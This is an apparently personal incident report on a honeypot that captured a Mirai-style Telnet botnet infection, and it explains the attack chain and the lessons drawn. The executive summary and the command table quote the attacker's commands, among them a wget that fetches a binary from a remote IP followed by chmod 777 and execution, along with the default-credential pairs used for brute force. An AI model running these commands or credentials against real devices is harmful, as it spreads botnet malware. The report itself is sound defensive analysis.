# Incident Report - Mirai-Style Telnet Malware Dropper

**Date range:** Nov 1, 2025 @ 08:26:28.000 - Nov 1, 2025 @ 08:29:22.026 (EST)  
**Honeypot:** T-Pot CE (Cowrie)  
**Source IP:** 194.183.173.206  
**Attack type:** Successful credential brute-force -> remote command execution -> malware download & execution  

---

## 1. Executive Summary

- **What happened:**  
  On November 1st, 2025, a host at 194.183.173.206 attempted several Telnet logins against my Cowrie honeypot. They were able to successfully login with the credentials `admin/1111`. Immediately after gaining access, the attacker executed a common Mirai-style infection script, including:
  - Exploring the environment (`cat /proc/mounts`)
  - Using BusyBox payloads
  - Downloading a malware binary from a remote server (`46.6.5.112:57610/.i`)
  - Granting execution permissions and running the binary (`chmod 777 .i; ./.i`)
  
  The attacker’s session only lasted about 100 seconds, ending after the malware attempted to run.

---

## 2. Environment

- **Honeypot platform:** T-Pot CE honeypot collection  
- **Services exposed:** Telnet (port 23)  
- **Logging stack:** Cowrie session logs / Elastic / Kibana  
- **Host location:** Amazon EC2 Instance  

The honeypot is configured to simulate an IoT-style Linux environment, which is commonly targeted by Mirai, Gafgyt, Mozi, and similar botnets.

## 4. Technical Details

### 4.1 Authentication Attempts

Observed brute force attempts:
- root/12345  
- default/antslq  
- root/zlxx.  
- root/hi3518  

Successful credential:
- admin/1111  

This pattern is typical of Mirai/Gafgyt botnets that cycle through known hardcoded IoT credentials.

### 4.2 Commands Executed

| Command | Purpose / Behavior |
|---------|---------------------|
| `system`, `enable`, `sh` | Script attempts to use shell or enable system mode (Mirai-style). |
| `cat /proc/mounts` | Lists mounted filesystems; common IoT recon. |
| `busybox YYYWM` | Uses BusyBox payload wrapper; signature of IoT bot families. |
| `cd /dev/shm` | Moves to tmpfs memory storage where malware often hides. |
| `tftp; wget` | Checks for file-transfer tools. |
| `dd bs=52 count=1 if=.s …` | Attempts to read or process a staging file `.s`. |
| `wget http://46.6.5.112:57610/.i` | Downloads the malware payload. |
| `chmod 777 .i` | Makes malware executable. |
| `./.i` | Executes the dropped malware. |

## 6. Analysis

This incident represents a complete IoT malware infection attempt, typical of commodity botnet activity such as Mirai, Gafgyt, Mozi, or their many variants. The attacker performed default-credential brute forcing, had a successful login, executed reconnaissance commands, staged files in temporary memory, downloaded a malicious payload, and attempted to execute it — all within approximately 100 seconds.

### 6.1 Attack Summary

After gaining access using the credential `admin/1111`, the attacker followed an automated infection pattern:

1. Checked the environment (`cat /proc/mounts`, BusyBox commands)  
2. Navigated to `/dev/shm` for staging files  
3. Attempted to read/modify a staging file (`.s`)  
4. Downloaded a malware binary from an external server  
5. Made the binary executable and ran it  

This sequence matches known IoT botnet loader scripts.

### 6.2 Evidence of Automation

Several details indicate the attacker was **not a human**, but part of an automated botnet:

- Commands were issued within milliseconds of each other.  
- The exact sequence of commands matches public Mirai/Gafgyt source code.  
- No attempts were made to explore the system interactively.  
- The session ended immediately after the malware was executed.  

These behaviors imply that the attackers device was already infected and scanning the internet automatically.

### 6.3 Attacker Intent

The goal of the attacker was to:

- Deploy a malware binary (`.i`)  
- Execute it to join the honeypot to a botnet

### 6.4 Malware Characteristics

The downloaded file had the SHA-256 hash: a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3

## 7. Conclusion

This incident represents a full end-to-end IoT malware infection attempt, beginning with credential brute forcing and downloading and execution a malicious binary. The attacker successfully authenticated using default credentials (`admin/1111`) and executed an automated sequence of commands typical of Mirai, Gafgyt, and similar botnet variants.

The infection flow followed a predictable pattern:

1. Telnet login brute force/ successful authentication  
2. Reconnaissance and environment probing  
3. File staging within `/dev/shm`  
4. Download of an external malware payload  
5. Execution of the downloaded binary  

This incident highlights several key security lessons:

- **Default credentials remain one of the largest attack vectors** for IoT devices.  
- **Telnet exposure is inherently dangerous** and should be disabled in all real environments.  
- **IoT botnets are active and constantly scanning**, even against random IP spaces.  
- **Automated attacks complete their infection chain rapidly**, often within seconds.
